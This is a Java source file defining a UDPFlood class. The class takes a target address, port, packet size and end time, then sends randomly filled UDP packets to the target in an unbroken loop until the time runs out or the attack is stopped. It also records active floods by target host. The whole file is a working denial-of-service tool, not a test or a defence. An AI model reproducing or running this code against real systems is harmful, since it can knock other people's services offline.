package br.com.introcdc.tests.sites;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.HashMap;
import java.util.concurrent.ThreadLocalRandom;

public class UDPFlood {

    private static final HashMap<String, UDPFlood> CACHE_UDPFLOOD = new HashMap<>();

    public static final int maxAttack = 3;

    public static HashMap<String, UDPFlood> getCacheUdpFlood() {
        return UDPFlood.CACHE_UDPFLOOD;
    }

    private final InetAddress address;
    private final int port;
    private final int size;
    private boolean started;
    private final long time;

    public UDPFlood(final InetAddress address, final int port, final long time, final int size) throws IOException {
        this.address = address;
        this.port = port;
        this.time = time;
        this.size = size;
        this.started = true;
    }

    public InetAddress getAddress() {
        return this.address;
    }

    public int getPort() {
        return this.port;
    }

    public int getSize() {
        return this.size;
    }

    public long getTime() {
        return this.time;
    }

    public boolean isStarted() {
        return this.started;
    }

    public void sendAttack() throws IOException {
        final DatagramSocket datagramSocket = new DatagramSocket();
        datagramSocket.connect(this.address, this.port);
        final byte[] packetRaw = new byte[this.size];
        ThreadLocalRandom.current().nextBytes(packetRaw);
        final DatagramPacket packet = new DatagramPacket(packetRaw, packetRaw.length);
        UDPFlood.getCacheUdpFlood().put(this.address.getHostAddress(), this);
        while (System.currentTimeMillis() <= this.time && this.isStarted()) {
            datagramSocket.send(packet);
        }
        UDPFlood.getCacheUdpFlood().remove(this.address.getHostAddress());
        datagramSocket.close();
    }

    public boolean stopAttack() {
        return this.started = false;
    }

}
